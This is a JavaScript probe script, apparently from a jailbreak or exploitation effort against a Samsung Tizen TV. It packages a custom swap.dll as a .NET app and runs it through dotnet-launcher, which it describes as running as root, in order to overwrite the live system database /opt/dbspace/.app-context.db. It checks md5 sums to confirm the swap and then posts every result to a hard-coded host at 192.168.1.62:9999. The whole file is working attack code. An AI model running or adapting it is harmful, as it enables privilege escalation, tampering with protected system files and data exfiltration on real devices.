"use strict";

/* p14: DOTNET SWAP — package swap.dll as a Tizen .NET app, run via dotnet-launcher (root),
   copy appctx_v2.db -> /opt/dbspace/.app-context.db (live). Oracle: markers + live md5. */
var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var SDK = '/home/owner/share/tmp/sdk_tools';
var R = { ts: new Date().toISOString(), probe: 'p14', results: {}, log: [] };

function L(s) { R.log.push(String(s).substring(0, 500)); }
function run(cmd, timeout) {
  try {
    return cp.execSync(cmd, { timeout: timeout || 30000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
  } catch (e) {
    var out = '';
    if (e.stdout) out += e.stdout.toString();
    if (e.stderr) out += (out ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status != null ? e.status : '?') + '] ' + (out || (e && e.message) || 'unknown');
  }
}
function postRaw(path, text) {
  var buf = new Buffer(text, 'utf8');
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: text/plain\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var sock = net.connect(PORT, HOST);
    sock.on('connect', function () {
      sock.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { sock.destroy(); }, 3000); return; }
        sock.write(buf.slice(off, off + 4096)); off += 4096;
      }, 100);
      setTimeout(function () { sock.destroy(); }, 60000);
    });
    sock.on('error', function (e) { L('post error ' + e.message); });
  } catch (e) { L('post ctor ' + e); }
}

var MANIFEST = '<?xml version="1.0" encoding="utf-8"?>\n' +
  '<manifest package="com.probe.swap" version="1.0.0" api-version="3.0" xmlns="http://tizen.org/ns/packages">\n' +
  '  <profile name="tv" />\n' +
  '  <ui-application appid="com.probe.swap" exec="swap.dll" multiple="false" nodisplay="false" taskmanage="false" type="dotnet-inhouse" launch_mode="single">\n' +
  '    <label>swap</label>\n' +
  '  </ui-application>\n' +
  '</manifest>\n';

R.results.csfs_manifest_ref = run('cat /usr/apps/com.samsung.tv.csfs/tizen-manifest.xml 2>&1 | head -30', 15000);

// clean old markers
run('rm -f /tmp/swap_done.txt /tmp/swap_err.txt 2>&1', 5000);

function live() { return run('md5sum /opt/dbspace/.app-context.db 2>&1', 15000); }
function markers() { return 'done=[' + run('cat /tmp/swap_done.txt 2>&1', 5000) + '] err=[' + run('cat /tmp/swap_err.txt 2>&1', 5000) + ']'; }

R.results.live_before = live();

// --- attempt 1: dotnet-launcher-inhouse on swapapp (dll in bin/, csfs-style) ---
function setup(appdir, dllname, dlldst) {
  try {
    fs.mkdirSync(appdir + '/bin', { recursive: true });
    fs.copyFileSync(SDK + '/' + dllname, appdir + '/bin/' + dlldst);
    fs.writeFileSync(appdir + '/tizen-manifest.xml', MANIFEST);
    return 'ok';
  } catch (e) { return 'setup-err: ' + e; }
}
R.results.setup_a = setup(SDK + '/swapapp', 'swap3.dll', 'swap.dll');
R.results.run1_inhouse = run('/usr/bin/dotnet-launcher-inhouse ' + SDK + '/swapapp 2>&1', 30000);
R.results.after_run1 = markers() + ' live=' + live();
R.results.run1_dotnet_logs = run('ls -t /tmp/dotnet_error.* 2>/dev/null | head -3', 5000);

// --- attempt 2: dotnet-launcher (non-inhouse) on same appdir ---
R.results.run2_inhouse = run('/usr/bin/dotnet-launcher ' + SDK + '/swapapp 2>&1', 30000);
R.results.after_run2 = markers() + ' live=' + live();

// --- attempt 3: dll in app root (not bin/) ---
function setup_root(appdir, dllname) {
  try {
    fs.mkdirSync(appdir, { recursive: true });
    fs.copyFileSync(SDK + '/' + dllname, appdir + '/swap.dll');
    fs.writeFileSync(appdir + '/tizen-manifest.xml', MANIFEST);
    return 'ok';
  } catch (e) { return 'setup-err: ' + e; }
}
R.results.setup_c = setup_root(SDK + '/swapapp_root', 'swap4.dll');
R.results.run3_inhouse_root = run('/usr/bin/dotnet-launcher-inhouse ' + SDK + '/swapapp_root 2>&1', 30000);
R.results.after_run3 = markers() + ' live=' + live();

R.results.journal_md5 = run('md5sum /opt/dbspace/.app-context.db-journal 2>&1', 15000);
R.results.final = 'done ' + new Date().toISOString();
postRaw('/p14info', JSON.stringify(R));
L('p14 done');
